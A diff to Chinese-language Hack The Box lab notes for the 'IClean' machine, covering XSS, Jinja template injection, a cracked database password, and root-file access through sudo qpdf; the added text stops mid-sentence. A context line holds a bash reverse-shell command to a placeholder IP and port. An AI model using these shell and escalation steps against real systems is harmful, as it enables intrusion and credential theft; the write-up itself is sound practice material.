@@ -641,7 +641,7 @@ powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c
 用此凭证尝试rdp登录成功，拿到userflag.
 ## Get Root Flag
 在收到的RDP界面，有一个powershell窗口在重复的执行selenium脚本，打开浏览器并登录webmail界面，输入Administrator及密码，使用这个凭证直接rdp登录拿到rootflag。
-# [HTB] IClean #XSS #Flask #SSTI #Jinja
+# [HTB] IClean #XSS #Flask #SSTI #Jinja #xpdf
 ## Enumeration
 NmapScan:
 ![[Pasted image 20240408165754.png]]
@@ -650,7 +650,7 @@ NmapScan:
 ![[Pasted image 20240408165911.png]]
 ![[Pasted image 20240408165937.png]]
 进入dashboard会重定向，这指示其需要验证。
-## Get User Shell
+## Get User Flag
 ### XSS
 在quote界面可以选择服务提交邮箱，服务的选择是以这样的方式被提交的：
 ![[Pasted image 20240408171702.png]]
@@ -719,5 +719,28 @@ bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
 ```
 设置好监听器，发送请求，拿到了www-data的shell:
 ![[Pasted image 20240408174326.png]]
+在当前目录下存在app.py，打开看到了数据库的凭证：
+![[Pasted image 20240408174626.png]]
+使用凭证登录数据库查User表:
+![[Pasted image 20240408174655.png]]
+用户consuela的密码hash值是可以被轻易匹配到的：
+`simple and clean`
+使用凭证登录ssh:
+![[Pasted image 20240408174911.png]]
+目录下拿到userflag
+## Get Root Flag
+执行sudo -l
+```sh
+[sudo] password for consuela: 
+Matching Defaults entries for consuela on iclean:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
+User consuela may run the following commands on iclean:
+    (ALL) /usr/bin/qpdf
+```
+用户只能在qpdf二进制文件上使用sudo
+搜索qpdf，其是一个实现pdf加密，融合等功能的工具
+查看其功能，会注意到有添加附件的功能：
+![[Pasted image 20240408175518.png]]
+那么可以将/root/root.txt附加到现有的d
 AboutSSTI:[SSTI (Server Side Template Injection) | HackTricks | HackTricks --- SSTI（服务器端模板注入） |黑客技巧 |黑客技巧](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
